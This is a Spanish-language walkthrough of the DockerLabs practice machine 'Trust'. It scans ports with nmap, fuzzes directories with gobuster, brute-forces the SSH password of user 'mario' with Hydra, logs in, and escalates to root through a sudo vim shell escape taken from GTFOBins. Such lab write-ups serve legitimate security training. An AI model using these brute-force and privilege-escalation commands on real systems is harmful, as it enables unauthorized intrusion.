Lo primero que tenemos que hacer, es ir a la pagina de "dockerlabs.es" y bajarnos la maquina "Trust".
Una vez hecho y COMO SIEMPRE, descomprimimos el archivo, e inicializamos la maquina con el comando:
```
sudo bash auto_deploy.sh trust.tar
```
Lo primero de todo, tras desplegarse la maquina, es hacer un NMAP. No necesitamos hacer un ARP-SCAN (o NETDISCOVER), porque ya sabemos la IP de la maquina victima.
```
nmap -p- --open -sCV -sS --min-rate 5000 172.18.0.2 -n -Pn -vvv
```
Una vez terminado, vemos que tiene 2 puertos abiertos:
```
Discovered open port 80/tcp on 172.18.0.2
Discovered open port 22/tcp on 172.18.0.2
```
En este caso, empezaremos por el puerto 80 ya que no tenemos ningun usuario ni nada, por lo que es conveniente ver si en la pagina, existe alguna informacion "util".
Para ello, introducimos la IP en el navegador y vemos una pagina "normal" de Apache.
Presionando "CTRL + U" no se ve nada aparentemente util en el codigo, por lo que procederemos a hacer un poco de FUZZING WEB:
```
gobuster dir -u http://172.18.0.2/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x .php,.html,.py
```
Se ve que hay una pagina que a primera vista parece interesante que es "/secret.php", por lo que entraremos en ella a ver que encontramos.
```
	===============================================================
	Starting gobuster in directory enumeration mode
	===============================================================
	/index.html           (Status: 200) [Size: 10701]
	/.html                (Status: 403) [Size: 275]
	/.php                 (Status: 403) [Size: 275]
	/secret.php           (Status: 200) [Size: 927]
	/.html                (Status: 403) [Size: 275]
	/.php                 (Status: 403) [Size: 275]
	/server-status        (Status: 403) [Size: 275]
	Progress: 830572 / 830576 (100.00%)
	===============================================================
	Finished
	===============================================================
```
Vemos un "cartel" en la pagina que pone:
```
Hola Mario,
Esta web no se puede hackear.
```
Bien, vemos que hay un usuario al menos que se llama "Mario", por lo que probaremos con HYDRA a hacer un ataque de fuerza bruta para conseguir la contraseña de dicho usuario. Probaremos a hacer el ataque al protocolo "SSH", ya que si recordamos cuando pasamos NMAP, estaba tambien abierto el puerto 22 (SSH).
```
hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.18.0.2
```
Una vez ha acabado, nos encuentra lo siguiente:
```
[DATA] attacking ssh://172.18.0.2:22/
[22][ssh] host: 172.18.0.2   login: mario   password: chocolate
1 of 1 target successfully completed, 1 valid password found
```
Perfecto, nos ha encontrado la contraseña del usuario "Mario", por lo que ahora vamos a probar a atacar el puerto 22 escribiendo:
```
ssh mario@172.18.0.2
```
Nos preguntara si queremos guardar la "fingerprint" a lo que damos que "yes". Despues nos pedira la clave que hemos sacado con HYDRA y tras ello, estariamos ya dentro de la maquina victima.
Tocaria ahora hacer una ESCALADA DE PRIVILEGIOS, para ello, escribiriamos por ejemplo, "sudo -l" y tras introducir la clave que nos pide (ya que la hemos obtenido con HYDRA), vemos que nos dice que este usuario "Mario", tiene permisos de "root" con el "vim":
```
Matching Defaults entries for mario on 8b6f2fd507aa:
    env_reset, mail_badpass,    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User mario may run the following commands on 8b6f2fd507aa:
    (ALL) /usr/bin/vim   <==== Aqui se ve que podemos usar "vim" como "root"
```
Entonces nos vamos a la pagina: "gtfobins.github.io" y buscamos el binario "vim", y en su apartado "SUDO" (recordar que hemos entrado con "sudo -l"), vemos que podemos ejecutar varios comandos. En este caso, yo escogere el apartado "a)" e introducire lo siguiente:
```
sudo vim -c ':!/bin/sh'
```
y ya estaria. Ya tendriamos permisos de root:
```
# whoami
root
# 
```
No obstante, para dejarlo mas "bonito" y tener prompt mas "normal", escribiriamos el comando "bash -p" quedandonos de la siguiente forma:
```
# whoami
root
# bash -p
root@8b6f2fd507aa:/home/mario# whoami
root
root@8b6f2fd507aa:/home/mario# 
```
Y ahora si, ya habriamos completado la intrusion de la maquina "Trust" de "dockerlabs.es" :)
